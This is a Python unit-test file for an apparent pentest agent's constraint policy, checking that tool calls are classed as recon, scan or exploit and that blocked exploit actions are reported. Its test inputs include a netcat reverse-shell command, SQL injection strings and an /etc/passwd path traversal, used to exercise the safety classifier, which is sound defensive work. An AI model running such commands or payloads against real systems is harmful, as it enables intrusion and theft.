"""Action-inference & phase-transition tests for vulnclaw.agent.constraint_policy.

Focused on ``infer_tool_action`` (the safety-critical recon/scan/exploit
classifier) and ``validate_phase_transition``; the ``validate_tool_action``
happy/blocked paths live in test_constraint_tool_action.py.
"""

from __future__ import annotations

from vulnclaw.agent.constraint_policy import (
    infer_tool_action,
    validate_phase_transition,
    validate_tool_action,
)
from vulnclaw.config.domain_models import PentestPhase, TaskConstraints


class TestInferToolAction:
    def test_local_meta_tools_are_recon(self):
        assert infer_tool_action("evidence_view", {"evidence_id": "e1"}) == "recon"
        assert infer_tool_action("crypto_decode", {"input": "eA=="}) == "recon"

    def test_nmap_is_recon(self):
        assert infer_tool_action("nmap_scan", {"target": "x"}) == "recon"

    def test_fetch_method_classification(self):
        assert infer_tool_action("fetch", {"url": "http://t/", "method": "GET"}) == "recon"
        assert infer_tool_action("fetch", {"url": "http://t/", "method": "POST"}) == "scan"

    def test_fetch_exploit_payload_is_exploit(self):
        got = infer_tool_action("fetch", {"url": "http://t/?q=1", "params": "1 or 1=1"})
        assert got == "exploit"
        assert infer_tool_action("fetch", {"url": "http://t/../../etc/passwd"}) == "exploit"

    def test_http_probe_batch_recon_scan_exploit(self):
        recon = infer_tool_action("http_probe_batch", {"requests": [{"url": "http://t/", "method": "GET"}]})
        assert recon == "recon"
        scan = infer_tool_action("http_probe_batch", {"requests": [{"url": "http://t/", "method": "POST"}]})
        assert scan == "scan"
        exploit = infer_tool_action(
            "http_probe_batch", {"requests": [{"url": "http://t/", "data": "union select 1"}]}
        )
        assert exploit == "exploit"

    def test_python_execute_classification(self):
        assert infer_tool_action("python_execute", {"code": "print(1+1)"}) == "recon"
        assert infer_tool_action("python_execute", {"code": "requests.get('http://t')"}) == "scan"
        assert infer_tool_action("python_execute", {"code": "os.system('id')"}) == "exploit"

    def test_shell_command_classification(self):
        assert infer_tool_action("shell_command", {"command": "whoami"}) == "recon"
        assert infer_tool_action("shell_command", {"command": "curl http://t/"}) == "scan"
        assert infer_tool_action("shell_command", {"command": "nc -e /bin/sh 1.2.3.4"}) == "exploit"

    def test_unknown_tool_defaults_to_scan(self):
        assert infer_tool_action("mystery_tool", {}) == "scan"
        assert infer_tool_action("brute_force_login", {}) == "scan"


class TestValidateAgainstConstraints:
    def test_local_meta_tool_never_violates(self):
        scope = TaskConstraints(allowed_actions=["recon"], blocked_actions=["scan", "exploit"])
        assert validate_tool_action("evidence_search", {"query": "x"}, scope) is None

    def test_blocked_exploit_action_is_reported(self):
        scope = TaskConstraints(allowed_actions=["recon", "scan"], blocked_actions=["exploit"])
        violation = validate_tool_action("shell_command", {"command": "nc -e /bin/sh 1.2.3.4"}, scope)
        assert violation is not None
        assert "shell_command" in violation and "exploit" in violation

    def test_phase_transition_respects_action_scope(self):
        scope = TaskConstraints(allowed_actions=["recon"], blocked_actions=["exploit"])
        # Moving into exploitation implies the blocked 'exploit' action.
        msg = validate_phase_transition(PentestPhase.EXPLOITATION, scope)
        assert msg is not None
        # A recon-phase transition is fine.
        assert validate_phase_transition(PentestPhase.RECON, scope) is None
